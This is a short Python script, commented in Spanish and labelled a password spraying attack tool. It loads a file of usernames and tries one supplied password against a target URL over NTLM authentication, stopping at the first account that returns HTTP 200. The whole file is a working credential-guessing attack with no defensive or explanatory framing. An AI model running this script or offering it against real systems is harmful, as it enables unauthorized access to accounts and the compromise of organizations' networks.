import requests
from requests_ntlm import HttpNtlmAuth
import argparse

def attack(username, password, target):
    try:
        # Realiza la petición HTTP con autenticación NTLM
        response = requests.get(target, auth=HttpNtlmAuth(username, password))
        
        # Verifica si la autenticación fue exitosa
        if response.status_code == 200:
            print(f"[SUCCESS] Username: {username}, Password: {password}")
            return 0
        else:
            print(f"[FAILURE] Username: {username}, Password: {password}, Status Code: {response.status_code}")
            return 1
    except Exception as e:
        print(f"[ERROR] Username: {username}, Password: {password}, Error: {e}")
        return 1

def main():
    # Parsear los argumentos de la línea de comandos
    parser = argparse.ArgumentParser(description='Password Spraying Attack Script')
    parser.add_argument('-u', '--userfile', type=str, required=True, help='Path to the user file')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password to use for spraying')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target URL')

    args = parser.parse_args() # Almacenar los argumentos en la variable args

    # Leer la lista de usuarios
    with open(args.userfile, 'r') as userfile:
        users = [line.strip() for line in userfile] # Almacenar los usuarios en una lista

    # Realizar el ataque para cada usuario
    for user in users:
        result = attack(user, args.password, args.target)
        if result == 0:
            print("Attack successful!")
            break
        else:
            print("Continuing with the next user...")

if __name__ == '__main__':
    main()
